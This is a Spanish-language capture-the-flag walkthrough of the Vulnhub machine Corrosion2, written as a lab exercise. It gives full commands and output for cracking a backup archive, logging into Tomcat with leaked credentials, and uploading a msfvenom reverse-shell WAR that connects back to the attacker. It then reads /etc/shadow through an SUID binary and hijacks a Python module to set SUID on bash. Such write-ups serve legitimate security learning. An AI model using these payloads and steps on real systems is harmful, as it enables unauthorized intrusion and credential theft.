---
title: Vulnhub - Corrosion2
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Information Leakage', 'Python Hijacking']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Corrosion2/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Corrosion2 Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Information Leakage, Python Hijacking**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Corrosion2/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Corrosion2/02-versions.png)

c. Fuzzeamos por directorios en el servicio web por el puerto **8080**

```bash
nmap -p8080 --script http-enum 192.168.100.22
```

![](/assets/images/Vulnhub/Easy/Corrosion2/03-fuzz.png)

* Nos descargamos el fichero /backup.zip, como está encriptado usaremos **zip2john backup.zip > hash** y crackeamos el hash con john

    ```bash
    john hash -w=/usr/share/wordlists/rockyou.txt 
    @administrator_hi5
    ```

* Al descomprimir **backup.zip** veremos el archivo tomcat-users.xml que tiene las siguientes credenciales

    ```xml
    <role rolename="manager-gui"/>
    <user username="manager" password="melehifokivai" roles="manager-gui"/>
    
    <role rolename="admin-gui"/>
    <user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
    ```

d. Ahora nos autenticamos en el servicio de Tomcat con las credenciales **admin:melehifokivai**

![](/assets/images/Vulnhub/Easy/Corrosion2/04-war.png)

* Subiremos un archivo **.war** malicioso el cual nos permita entablarnos una reverse shell

    ```bash
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Atacante> LPORT=443 -f war -o ./backup.war
    ```
    > Creamos el fichero .war con msfvenom

* Nos podemos en escuchar con nc y ejecutamos el fichero malicioso dando click en:

![](/assets/images/Vulnhub/Easy/Corrosion2/05-app.png)

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.70] from (UNKNOWN) [192.168.100.22] 34048
script /dev/null -c bash
Script started, file is /dev/null
bash-5.0$
```

### Escalada de Privilegios 💹

a. Vemos que existen más usuarios por lo que intentamos convertirnos en alguno con la misma credencial de Tomcat

```bash
tomcat@corrosion:/var/spool/cron$ cd /home/
tomcat@corrosion:/home$ ls
jaye  randy
tomcat@corrosion:/home$ su jaye
Password: melehifokivai
bash-5.0$ whoami
jaye
```

b. Listamos binarios con permisos SUID

```bash
jaye@corrosion:/home$ find / -perm -4000 2>/dev/null

/home/jaye/Files/look
<SNIP>
```

* **look** nos permite leer archivos, en este caso, podemos leer archivos a los cuales no tenemos acceso.

    ```bash
    jaye@corrosion:~/Files$ ./look '' /etc/shadow

    <SNIP>
    randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
    ```

* Crackeamos el hash

    ```bash
    john randy_hash -w=/usr/share/wordlists/rockyou.txt 
    07051986randy    (?)
    ```

c. Nos convertimos en randy y listamos posibles permisos en el archivo **sudoers**

```bash
randy@corrosion:/home/jaye/Files$ sudo -l
[sudo] password for randy: 

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

* Contenido del fichero **/home/randy/randombase64.py**

    ```py
    import base64

    message = input("Enter your string: ")
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    print(base64_message)
    ```

* También vemos un fichero note.txt

    ```bash
    Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know
    that I changed your permissions for your home directory. You won't be able to remove or add files for now.

    I will change these permissions later on.

    See you next Monday randy!
    ```
    > Nos dicen que no podemos modificar o crear archivos en nuestro directorio de usuario.

* Vemos que se usa la librería **base64**, pero, como no podemos crear un ficheros en nuestro directorio, no podemos suplantar el módulo base64 por lo que veremos si podemos alterar el módulo nativo

    ```bash
    randy@corrosion:~$ locate base64
    /usr/lib/python3.8/base64.py
    <SNIP>
    randy@corrosion:~$ ls -al /usr/lib/python3.8/base64.py
    -rwxrwxrwx 1 root root 43 Aug 10 11:28 /usr/lib/python3.8/base64.py
    ```

* Al tener permisos para editar el **módulo nativo** lo que haremos es eliminar su contenido y sustituirlo por 

    ```py
    randy@corrosion:~$ cat /usr/lib/python3.8/base64.py
    import os

    os.system("chmod +s /bin/bash")
    ```

d. Por último, ejecutamos el programa **/home/randy/randombase64.py**

```bash
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
Enter your string: s
randy@corrosion:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
randy@corrosion:~$ bash -p
bash-5.0# whoami
root
```